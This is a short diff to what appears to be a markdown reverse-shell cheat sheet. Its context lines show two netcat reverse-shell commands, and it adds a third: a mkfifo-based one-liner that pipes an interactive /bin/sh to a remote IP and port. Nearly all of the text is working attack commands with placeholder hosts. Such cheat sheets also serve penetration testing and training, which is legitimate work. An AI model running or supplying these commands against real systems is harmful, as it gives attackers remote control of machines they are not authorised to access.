@@ -27,6 +27,10 @@ nc -e /bin/sh IP 80
 or 
 
 /bin/sh | nc IP PORT
+
+or
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
 ```
 
 ## Python
